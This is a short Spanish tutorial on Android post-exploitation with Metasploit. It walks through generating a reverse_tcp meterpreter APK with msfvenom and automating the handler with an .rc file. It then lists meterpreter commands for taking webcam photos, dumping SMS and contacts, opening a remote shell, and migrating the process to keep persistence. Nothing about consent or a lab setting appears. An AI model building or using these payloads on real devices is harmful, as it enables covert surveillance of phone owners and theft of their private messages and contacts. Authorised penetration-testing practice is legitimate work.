# Post-Explotación con Metasploit en Android

Veremos algunos comandos de **post-explotación**, los cuales pueden aplicarse contra Android, Windows o Linux. En esta práctica nos enfocaremos en Android.

## Preparación del Payload

Crea el payload para Android con `msfvenom` (puedes añadir un encoder si lo deseas):

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=[TU_IP] LPORT=[TU_PUERTO] -o payload.apk
```

## Automatización con archivos `.rc`

Para agilizar la activación del handler, crea un archivo con extensión `.rc` (ej. `handler.rc`):

```text
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set lhost [TU_IP]
set lport [TU_PUERTO]
exploit
```

Ejecuta Metasploit cargando el archivo:
```bash
msfconsole -r handler.rc
```

## Comandos de Meterpreter (Post-Explotación)

Una vez obtenida la sesión, puedes utilizar los siguientes comandos:

*   **`help`**: Muestra todos los comandos disponibles.
*   **`sysinfo`**: Obtiene información del host y del sistema operativo.
*   **`ps`**: Lista todos los procesos en ejecución.
*   **`pwd`**: Muestra el directorio de trabajo actual en el dispositivo.
*   **`webcam_list`**: Lista las cámaras del dispositivo.
*   **`webcam_snap [ID]`**: Captura una foto (1 para frontal, 2 para trasera).
*   **`shell`**: Abre una shell básica de Linux en el dispositivo.
*   **`dump_sms`**: Descarga los mensajes SMS a un archivo de texto.
*   **`dump_contacts`**: Descarga la lista de contactos.
*   **`getuid`**: Muestra el usuario con el que se está ejecutando el proceso.
*   **`migrate [PID]`**: Migra el payload a otro proceso para mantener la persistencia.

> **Nota:** NO memorices aprende practicando, que la genialidad es igual a la repetición.
